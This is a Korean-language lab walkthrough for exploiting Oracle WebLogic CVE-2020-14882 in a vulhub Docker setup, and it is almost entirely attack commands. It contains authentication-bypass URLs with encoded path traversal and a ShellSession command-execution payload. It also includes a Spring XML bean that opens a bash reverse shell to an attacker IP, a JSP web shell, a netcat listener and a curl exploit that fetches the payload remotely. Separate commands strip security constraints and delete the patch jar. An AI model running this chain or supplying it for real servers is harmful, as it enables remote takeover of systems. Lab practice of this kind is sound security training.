###실습환경
##공격자 운영체제
Linux (Ubuntu)

## docker 환경구축
cd vulhub/weblogic/CVE-2020-14882
docker-compose up -d

###우회 코드
##콘솔 구성요소 우회
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal

##업로드 권한 우회
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")

## 역쉘 구축(rce.xml)
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[bash -i >& /dev/tcp/<공격자_IP>/4444 0>&1]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>

## 웹쉘 코드 구축(JSP)
cd /tmp
cat <<EOF > shell.jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if (cmd != null) {
    String s;
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
    while ((s = sI.readLine()) != null) { output += s + "\\n"; }
}
out.println(output);
%>
EOF

## 파이썬 서버 실행(rce.xml 실행)
python3 -m http.server 8080

## 역쉘 리스너 실행
nc -lvnp 4444

## 익스플로잇 실행
curl --path-as-is -X GET "http://localhost:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://<공격자_IP>:8080/rce.xml\")"

### 취약 서버 적용
##web.xml 수정
sed -i '/<security-constraint>/,/<\/security-constraint>/d' /u01/oracle/wlserver/server/lib/consoleapp/webapp/WEB-INF/web.xml

##패치 파일 제거
rm -f /u01/oracle/wlserver/modules/com.oracle.weblogic.management.patching.jar

## 재실행
docker restart 컨테아너ID
